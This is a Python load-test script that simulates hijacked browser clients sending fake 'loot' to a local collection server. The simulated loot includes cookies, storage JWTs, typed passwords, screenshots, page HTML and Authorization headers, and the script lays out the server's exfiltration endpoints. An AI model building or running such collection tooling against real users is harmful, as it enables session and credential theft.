#!usr/bin/env python
import json
import threading
import time
import random
import requests
import base64


# Script to simulate clients sending in loot
# To stress test the system, see how well it
# holds up


numClients = 1


randStartRange = 1
randEndRange   = 10


apiServer = "https://127.0.0.1:8444"
victimApp = "https://vulnerableapp.com"




fakeHtml = """
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum malesuada mollis pretium. Sed ut faucibus nulla, euismod blandit lacus. Etiam dolor libero, pulvinar tristique pharetra non, porttitor vitae enim. Vestibulum fermentum, tellus at tempor blandit, sapien orci dignissim libero, et malesuada ligula metus posuere nisi. Nullam a gravida mauris. Aliquam tortor massa, dapibus nec scelerisque non, faucibus ut dolor. Ut id tincidunt purus, et ultrices arcu.

Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Vivamus dictum elit non ultricies placerat. Aenean eleifend justo nec leo tincidunt malesuada. Vivamus tellus massa, posuere at odio a, consequat venenatis ligula. Quisque vel ante vel diam hendrerit pellentesque. In hac habitasse platea dictumst. Integer nec magna vitae augue viverra tincidunt. Donec scelerisque eleifend rhoncus.

Phasellus tincidunt nulla urna, sit amet pellentesque purus dictum id. Ut eget augue congue, pellentesque magna et, bibendum velit. Donec et magna ut diam congue rhoncus sit amet a nisl. Proin consectetur vel urna sed ornare. Praesent odio leo, pellentesque eu ullamcorper at, vestibulum ac libero. Aliquam finibus mollis sagittis. Aliquam fermentum finibus est, sed varius purus consectetur vel. Curabitur vitae efficitur felis. Nullam imperdiet enim ut mauris scelerisque laoreet. Phasellus egestas purus quis leo mollis, in sollicitudin dui ornare. Praesent laoreet aliquam eros vel suscipit.

Integer sed pretium massa. Sed eget diam magna. Cras ultricies imperdiet vestibulum. Maecenas mattis purus vitae arcu semper, et commodo tortor pellentesque. In hac habitasse platea dictumst. Sed pharetra dictum velit vitae viverra. Ut erat sapien, placerat quis ex sit amet, dignissim vestibulum tortor. Fusce convallis, mi elementum volutpat rhoncus, magna urna vulputate felis, a finibus mi elit vel lectus. Mauris auctor lacinia nibh, posuere interdum mauris imperdiet id. Vivamus sagittis risus et est lobortis, eget sodales urna imperdiet. Nunc a risus at diam porta feugiat ac quis orci. In accumsan, quam posuere laoreet interdum, magna est blandit mauris, et sodales metus dolor non est. Pellentesque non quam enim.

Nulla ante mauris, bibendum a dolor at, viverra posuere tellus. Ut dignissim pellentesque metus. Ut ut euismod nisl. Cras diam leo, elementum at massa non, tristique placerat nulla. Nunc ut sapien efficitur, ultrices lectus ac, pretium sem. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec nec sodales eros, at eleifend magna. Sed pellentesque sodales risus porta molestie. Phasellus egestas odio eget elit iaculis, vel varius libero malesuada. Maecenas maximus fermentum augue. Donec finibus volutpat rhoncus. Vestibulum nec tincidunt libero. Integer sit amet velit vel nisi auctor pellentesque. Vestibulum dolor dolor, consectetur at urna a, luctus suscipit dolor. Integer turpis leo, scelerisque sit amet diam vel, semper euismod sapien. Donec cursus risus in dolor ultrices, eu pharetra ex gravida.

Duis eu ipsum at enim gravida lacinia. Mauris sapien lorem, tincidunt at convallis in, convallis auctor augue. Suspendisse at mi efficitur, auctor risus ac, accumsan tortor. Aenean vel neque nunc. Ut ut dui metus. In sodales magna at libero sodales, sit amet ornare est varius. Nam ac finibus odio. Curabitur non consectetur eros. Sed dolor augue, sodales non ligula a, aliquet placerat lectus. Nunc molestie ligula et ligula tincidunt, eget porttitor ipsum egestas. Morbi id consectetur erat. Nunc porttitor porta commodo.

Aenean augue orci, tincidunt vestibulum pharetra eu, molestie id tellus. Aenean condimentum ipsum at est feugiat dapibus. In sit amet lectus vel ex malesuada bibendum. Cras consequat sem id felis feugiat, eget suscipit tortor placerat. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla sit amet ligula vel ipsum interdum ullamcorper. Nunc eget sodales nisl. Quisque vel tempus mi.

Donec vulputate nibh non placerat rhoncus. Etiam placerat blandit leo nec sagittis. Aliquam gravida tortor ac ex mollis, vitae iaculis ligula elementum. Donec venenatis, magna feugiat suscipit tempor, mi magna facilisis velit, ac aliquet nisi nisi quis turpis. Suspendisse fringilla rutrum lectus, sed tempus ligula pellentesque vel. Donec risus massa, luctus in dolor at, finibus gravida ipsum. Integer finibus at diam et aliquam. Suspendisse at tincidunt tellus. Sed sed tortor id lacus ultricies aliquet ut eget lacus. Suspendisse sollicitudin feugiat dui, luctus scelerisque magna pretium nec. In vel lorem consequat, pellentesque ex ac, malesuada quam. Nam lobortis vel odio quis rhoncus. Donec sit amet risus vulputate, pulvinar orci eu, ultricies justo. In diam leo, consectetur et est sed, interdum consequat augue. Pellentesque accumsan ac nunc non rutrum. Nunc leo nibh, finibus eget eleifend quis, fermentum sed odio.

Sed efficitur pulvinar sodales. Morbi faucibus metus ipsum, in tempor nunc sagittis eu. Vivamus odio quam, fringilla eu mi a, fermentum efficitur tortor. Aenean non imperdiet lacus, ut condimentum dolor. Donec ipsum dui, consectetur vel nunc tempus, bibendum maximus felis. Vivamus ultrices dui erat, non tempor mi tincidunt sed. Sed gravida porttitor quam eget convallis. Duis quis velit eu eros varius convallis. Nullam sollicitudin consequat quam at lacinia. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Proin quis magna vel ante condimentum commodo ac suscipit lectus.

Pellentesque condimentum tristique suscipit. Quisque tempor diam dui, id bibendum purus faucibus a. Maecenas ac nulla tempor, condimentum est sed, faucibus purus. Nunc sit amet ligula in augue euismod varius ultrices a est. Duis dignissim ipsum sed arcu tincidunt efficitur. Pellentesque iaculis elementum laoreet. Phasellus lobortis suscipit arcu, vitae sagittis tellus accumsan a. Vivamus tincidunt egestas diam vel condimentum. Donec a ex sollicitudin lorem viverra tempus eu at nunc. Nulla facilisi. Suspendisse interdum, nunc semper commodo accumsan, metus sapien faucibus nulla, at pharetra sapien orci non erat. Nam tristique, dolor id commodo ornare, justo dolor porttitor turpis, in porttitor eros massa at felis. Mauris ultrices ultricies lorem, at maximus urna accumsan et. Praesent pulvinar tincidunt odio nec pellentesque. Nulla facilisi. Praesent nec diam vitae purus condimentum tincidunt.

Quisque convallis lacus ac sagittis commodo. In hac habitasse platea dictumst. Nulla id est arcu. Sed diam tortor, viverra vel pellentesque nec, varius id nunc. In rhoncus, enim et ultricies semper, purus ligula ultrices eros, non sollicitudin ex turpis eget ipsum. Integer lacinia enim eget magna condimentum, non pharetra diam pulvinar. Donec vehicula justo euismod pharetra faucibus. Quisque faucibus sapien convallis, tempor augue quis, hendrerit felis. Cras vestibulum pretium libero, vel mollis diam ultrices vel. Nunc id eros pellentesque, dictum nisi laoreet, varius justo. Pellentesque velit nisi, iaculis ac arcu et, fermentum semper velit. Suspendisse potenti. Donec pellentesque mauris at nulla venenatis, ac blandit lectus placerat. Mauris metus tellus, ultrices id pulvinar vitae, vulputate non purus.

Etiam malesuada lacus nec congue dignissim. Praesent commodo, lorem a tristique tristique, massa leo rhoncus arcu, sit amet faucibus sem nisl pretium leo. Donec non aliquet mi. Vestibulum sed orci sit amet enim fringilla sollicitudin. Proin in tristique metus. Aliquam erat volutpat. Vivamus tincidunt felis et congue cursus. Vivamus ac metus ut eros fermentum semper a eget risus. Aliquam erat volutpat. Pellentesque dignissim justo vitae neque tristique dictum.

Aenean eu tempus odio. Phasellus vitae egestas arcu. Phasellus volutpat urna non enim sodales vehicula. Morbi imperdiet nisl dictum lacus porttitor, eu rhoncus tellus tristique. Aliquam id posuere ante, ac faucibus lorem. Sed id turpis nec enim ultricies tempor sed non nibh. Nullam quis diam quis diam eleifend tempor. Interdum et malesuada fames ac ante ipsum primis in faucibus. Etiam consequat nulla eu dictum tincidunt. Donec convallis mauris sed quam pulvinar, ac porta mauris semper. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Etiam imperdiet neque ut metus convallis, scelerisque laoreet leo lacinia. Aenean rhoncus urna pretium mauris euismod ultricies. Donec euismod bibendum sapien non aliquam. Maecenas fringilla dignissim purus, et consequat lectus consequat ac. Morbi efficitur dolor eget tincidunt egestas.

Integer mi dui, semper at mollis eu, interdum eu dui. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus at est nec urna mollis faucibus sit amet vel urna. Quisque porttitor lacus non pharetra facilisis. Etiam sed varius mi. Integer vel posuere lacus, et pellentesque lectus. Curabitur in interdum orci. Sed nec ultricies diam, et malesuada nisi. Fusce ornare varius dui sed mattis. Etiam ultricies arcu ac libero condimentum, sed ultricies ligula placerat. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus mattis commodo convallis. Donec et iaculis justo. Etiam vel lorem non purus gravida facilisis et a tortor. Morbi nec ante ornare, tincidunt mi et, ultricies mi. Ut sit amet iaculis ligula, et pulvinar mauris.

Duis eget egestas massa. Donec consectetur pellentesque urna, vel gravida orci rhoncus non. Nam eget neque eget tellus commodo tincidunt nec sed neque. Sed purus sapien, bibendum facilisis lacinia vitae, commodo a elit. Cras iaculis purus ut tristique bibendum. Aliquam erat volutpat. Nunc risus dolor, dapibus eu sem vel, fringilla tincidunt felis. Nam tristique aliquet orci, vel ornare nibh sagittis non.

Nullam eget sagittis erat, sed sagittis risus. Vestibulum suscipit, elit eu placerat interdum, lorem lorem interdum est, eu cursus turpis neque eu orci. Quisque ac varius nisl, vitae pellentesque leo. Donec feugiat turpis in tempor ultricies. Nunc elementum mollis tellus, et faucibus leo dictum vitae. Sed non purus tincidunt, dignissim magna varius, imperdiet arcu. Sed scelerisque auctor aliquet. Mauris in arcu convallis, hendrerit lectus vel, vulputate neque. Ut elit lorem, pharetra venenatis est ut, auctor pellentesque sem. Fusce venenatis velit ut turpis pharetra condimentum. Nam vel turpis leo. Etiam aliquet leo nec libero vulputate vestibulum. Nullam sagittis augue ut sapien venenatis feugiat. Aenean eu neque sit amet neque finibus fringilla et sit amet sem.

Proin tincidunt, elit eu bibendum rutrum, ex dolor feugiat mauris, eget ultricies tortor augue id est. Mauris non turpis odio. Nam nec viverra sem. Duis ultricies molestie elit vel mattis. Donec libero tortor, fringilla sit amet vestibulum sed, blandit sed massa. Nulla facilisi. Nulla odio turpis, lobortis non turpis sit amet, cursus viverra sem. Integer venenatis at lectus ut commodo. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae;

Aenean tempus nisl diam, ullamcorper pellentesque purus aliquam eget. Nullam lacus tortor, tempor at magna at, tincidunt hendrerit urna. Maecenas commodo luctus consectetur. In imperdiet pulvinar magna a bibendum. Praesent quis interdum nulla. Duis sit amet condimentum est, sed dictum massa. Ut non accumsan enim, at sodales nulla. Morbi sed nisi odio. Nam urna justo, ultrices a sodales et, viverra non dui. Phasellus cursus nisl nec placerat convallis. Ut imperdiet nulla tortor, volutpat consectetur nulla aliquam ut. Proin pretium pharetra libero sit amet posuere. Morbi rutrum mi non commodo convallis. Phasellus condimentum velit a laoreet elementum. Suspendisse lorem erat, imperdiet in nulla sit amet, aliquet tincidunt nibh. Sed consectetur ullamcorper mi non bibendum.

Nunc pellentesque eu urna sed molestie. Cras mattis arcu justo, quis eleifend leo imperdiet iaculis. Cras purus odio, facilisis ac tellus in, finibus luctus odio. Donec sit amet ultrices odio. Pellentesque in lacus sapien. In porttitor velit nisl, quis interdum lacus fermentum nec. Ut sit amet magna ut purus interdum molestie. Fusce sollicitudin in neque eget laoreet. Maecenas eu urna sem. Maecenas quis ante varius, semper orci nec, aliquam ipsum. Donec et interdum lacus.

Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Mauris dignissim vel augue id consequat. Quisque congue ex turpis, id ultrices augue tincidunt vel. Cras venenatis odio quam, quis vehicula urna pretium sed. Nullam iaculis fermentum dolor non maximus. In odio dolor, sollicitudin eu risus eu, cursus ornare tellus. Maecenas ullamcorper ligula at congue fringilla. Donec malesuada ligula at felis laoreet facilisis. Quisque tempus, eros ut blandit lacinia, risus mauris hendrerit purus, vitae finibus mauris lorem et nulla. Vestibulum urna erat, aliquam facilisis pulvinar dignissim, fringilla ac tortor. Nulla id justo vehicula, aliquam nisl sit amet, pulvinar lacus. Nulla eu tempus nunc, nec lobortis justo. Integer nec malesuada mi. Pellentesque porttitor tortor id leo viverra, et ultrices magna malesuada. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Maecenas mattis molestie turpis in sollicitudin. 

"""


with open('./clientSimulatorScreenshot.png', 'rb') as image_file:
	screenshotData = image_file.read()



class Client(threading.Thread):
	def __init__(self, client_id):
		super().__init__()
		self.client_id = client_id
		self.getUUID()

		print("Client " + str(self.client_id) + " UUID: " + self.uuid)

		self._running  = True


	def run(self):
		while self._running:
			print("Client " + str(self.client_id) + " run loop")


			# Need a pattern of behavior here
			# URL change
			# Storage/cookie change
			# Screenshot
			# HTML Scrape
			# User Inputs
			# API Calls

			self.urlEvent()
			self.cookieEvent()
			time.sleep(0.1)

			self.localStorageEvent()
			time.sleep(0.05)

			self.sessionStorageEvent()
			time.sleep(0.2)

			self.screenshotEvent()
			self.htmlEvent()
			time.sleep(0.3)
			
			self.userInputEvent()
			self.xhrOpenEvent()
			self.xhrSetHeaderEvent()
			self.xhrCallEvent()
			time.sleep(0.1)
			
			self.fetchSetupEvent()
			self.fetchHeaderEvent()
			self.fetchCallEvent()

			sleepAmount = random.randint(randStartRange, randEndRange)
			print("Client " + str(self.client_id) + " waiting: " + str(sleepAmount))
			time.sleep(sleepAmount)


	def getUUID(self):
		print("Retrieving UUID")
		req = requests.get(apiServer + '/client/getToken', verify=False)
		if req.status_code == 200:
			data = req.json()
			print(data)
			self.uuid = data["clientToken"]
		else:
			print("Failed to receive UUID")


	def stop(self):
		print("Stopping client thread...")
		self._running = False


	def cookieEvent(self):
		print("Sending cookie...")
		req = requests.post(apiServer + '/loot/dessert/' + self.uuid, json={
			"cookieName": "cookieMonster",
			"cookieValue": "goYum"
			}, verify=False)


	def localStorageEvent(self):
		print("Sending local storage event...")
		req = requests.post(apiServer + '/loot/localstore/' + self.uuid, json={
			"key": "localStorageKey",
			"value": "localStorageSuperSecretJWTValue"
			}, verify=False)


	def sessionStorageEvent(self):
		print("Sending session storage event...")
		req = requests.post(apiServer + '/loot/sessionstore/' + self.uuid, json={
			"key": "sessionStorageKey",
			"value": "sessionStorageSuperSecretJWTValue"
			}, verify=False)



	def urlEvent(self):
		print("Sending URL event...")
		req = requests.post(apiServer + '/loot/location/' + self.uuid, json={
			"url": victimApp + "/totesDashboard"
			}, verify=False)


	def htmlEvent(self):
		print("Sending HTML event...")
		req = requests.post(apiServer + '/loot/html/' + self.uuid, json={
			"url": victimApp + "/totesDashboard",
			"html": fakeHtml
			}, verify=False)


	def screenshotEvent(self):
		print("Sending screenshot event...")

		header = {'Content-Type': 'image/png'}
		req = requests.post(apiServer + '/loot/screenshot/' + self.uuid, 
			data = screenshotData, 
			headers=header, verify=False)


	def userInputEvent(self):
		print("Sending user input event...")
		req = requests.post(apiServer + '/loot/input/' + self.uuid, json={
			"inputName": "secretPassword",
			"inputValue": "MyVoiceIsMyPassport"
			}, verify=False)


	def xhrOpenEvent(self):
		print("Sending XHR Open event...")
		req = requests.post(apiServer + '/loot/xhrOpen/' + self.uuid, json={
			"method": "POST",
			"url": victimApp + "/sensitiveAPI/secretShit"
			}, verify=False)


	def xhrSetHeaderEvent(self):
		print("Sending XHR Header Event...")
		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.uuid, json={
			"header": "Authorization",
			"value": "SECRET_JWT_VALUE"
			}, verify=False)

		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.uuid, json={
			"header": "RandomHeader",
			"value": "SomethingOrAnother"
			}, verify=False)




	def xhrCallEvent(self):
		print("Sending XHR call event...")

		requestString  = "{'something':'something value', 'something else': 'some other value'}"
		responseString = "{'responseSomethin201g':'something value', 'responseSomething else': 'some other value'}"

		requestBody  = base64.b64encode(requestString.encode())
		responseBody = base64.b64encode(responseString.encode())

		req = requests.post(apiServer + '/loot/xhrCall/' + self.uuid, json={
			"requestBody": requestBody.decode(),
			"responseBody": responseBody.decode()
			}, verify=False)


	def fetchSetupEvent(self):
		print("Sending Fetch Setup Event...")
		req = requests.post(apiServer + '/loot/fetchSetup/' + self.uuid, json={
			"method": "POST",
			"url": victimApp + "/sensitiveAPI/fetchSecretShit"
			}, verify=False)


	def fetchHeaderEvent(self):
		print("Sending Fetch Header Event...")
		req = requests.post(apiServer + '/loot/fetchHeader/' + self.uuid, json={
			"header": "Authorization",
			"value":"SECRET_JWT_VALUE"
			}, verify=False)



	def fetchCallEvent(self):
		print("Sending Fetch Call Event...")

		requestString  = "{'something':'fetchSomething value', 'something else': 'fetch some other value'}"
		responseString = "{'responseSomething':'something value', 'responseSomething else': 'some other value'}"

		requestBody  = base64.b64encode(requestString.encode())
		responseBody = base64.b64encode(responseString.encode())

		req = requests.post(apiServer + '/loot/fetchCall/' + self.uuid, json={
			"requestBody": requestBody.decode(),
			"responseBody": responseBody.decode()
			}, verify=False)




if __name__ == "__main__":
	clientThreads = []

	for i in range(numClients):
		clientThread = Client(client_id=i)
		clientThread.start()
		clientThreads.append(clientThread)


	try:
		while True:
			time.sleep(5)
	except KeyboardInterrupt:
		for clientThread in clientThreads:
			clientThread.stop()

		for clientThread in clientThreads:
			clientThread.join()